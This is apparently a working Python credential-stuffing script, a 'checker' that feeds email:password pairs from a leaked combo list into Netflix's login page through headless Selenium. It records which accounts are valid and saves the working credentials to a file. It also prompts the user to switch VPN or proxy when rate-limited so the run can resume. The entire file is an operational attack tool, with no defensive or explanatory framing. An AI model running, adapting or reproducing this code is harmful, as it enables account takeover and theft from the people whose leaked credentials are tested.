import time
import requests
import os
from split_method import determine_split_method
from pathlib import Path
from header import title
from countries import find_IP
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By

current_split_method = determine_split_method()

def print_ip_and_country():
	if current_split_method != "None":
		print("\n\033[38;5;7mCurrent IP: {} : {} | Fetching {} accounts\n".format(details[0], details[1], details[2]))
	else:
		print("\n\033[38;5;7mCurrent IP: {} : {} | No Countries in Combo\n".format(details[0], details[1]))

counter = 0
user =[]
passw =[]
updated_list=[]
files = []
resume_flag = False
clear_page = 0
details = [find_IP()[0], find_IP()[1], find_IP()[2]]
directory = str(Path(__file__).parent)

for file_ in os.listdir(directory):
	files.append(file_)
	
for file_ in range(len(files)):
	if 'resume' in files[file_]:
		resume_flag = True
		print("\033[38;5;7m\nResume file found. Resuming from given combo.")
		with open('resume','r') as resume:
			for line in resume.readlines():
				user.append(line.split(":")[0])
				passw.append(line.split(":")[1])
		break
		
	if file_ == len(files)-1:
		with open('netflix','r') as net:
			for line in net.readlines():
				if details[2] in line:
					user.append(line.split(":")[0])
					passw.append(line.split(":")[1].split(current_split_method)[0].strip())
				elif current_split_method == "None":
					user.append(line.split(":")[0])
					passw.append(line.split(":")[1])
			for line in range(len(user)):	
				updated_list.append("{}:{}\n".format(user[line], passw[line].strip()))
		net.close()

print_ip_and_country()
page = "https://www.netflix.com/login"

while counter < len(user):
	try:
		print("\033[38;5;7m\nConnection Status:\033[38;5;46m OK \033[38;5;7m| \033[38;5;7mCombo No.{}:\033[38;5;190m {}:{} \033[38;5;7m| Result: ".format(str(counter), user[counter], passw[counter].strip()),end='')

		#Account Checker
		browser_options = Options()
		browser_options.add_argument ={'user-agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36'}
		browser_options.headless = True
		browser = webdriver.Chrome(options = browser_options)
		browser.set_window_size(300,400)
		browser.get(page)		
		time.sleep(0.4)
		login = browser.find_element(By.XPATH, '//*[@id="id_userLoginId"]')
		password = browser.find_element(By.XPATH, '//*[@id="id_password"]')
		button = browser.find_element(By.XPATH, '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/form/button')
		login.send_keys(user[counter])
		time.sleep(0.2)
		password.send_keys(passw[counter].strip())
		time.sleep(0.2)
		button.click()
		time.sleep(2)
		
		if browser.find_elements(By.XPATH, '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/div/div[2]'):
			login_error = browser.find_element(By.XPATH, '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/div/div[2]').text
			if "Sorry, we can't find an account with this email address." in login_error:
				print("\033[38;5;196m Invalid Email",end='')

			if "Incorrect password" in login_error:
				print("\033[38;5;196m Invalid Password",end='')

		if browser.find_elements(By.XPATH, '//*[@id="formstart"]/button/span[1]'):
			print("\033[38;5;196m Account Cancelled",end='')

		if browser.find_elements(By.XPATH, '//*[@id="appMountPoint"]/div/div/div[1]/div[1]/div[2]/div/div/h1'):
			print("\033[38;5;46m Valid Account - Stored",end='')
			with open('valid','a') as valid:
				valid.write("{}:{}\n".format(user[counter],passw[counter]))
		
		if len(updated_list) > 1:
			del updated_list[0]
			
		if clear_page > 10:
			title()
			print_ip_and_country()
			clear_page = 0
		time.sleep(1)
		counter += 1
		clear_page += 1
		browser.close()
	except:
		request = requests.get(page)		
		if request.status_code == 403:
			print("\033[38;5;7m\nConnection Status:\033[38;5;190m Too many requests:\033[38;5;196m Access Denied \n\n\033[38;5;7mChange VPN/Proxy and start the checker again to resume from current combo.\n")
			with open('resume','a') as resume:
				for line in range(len(updated_list)):
					resume.write("{}\n".format(updated_list[line].strip()))
			resume.close()
			exit()
		
print("\n\033[38;5;226mAll done.")
if resume_flag == True:
	os.remove('resume')
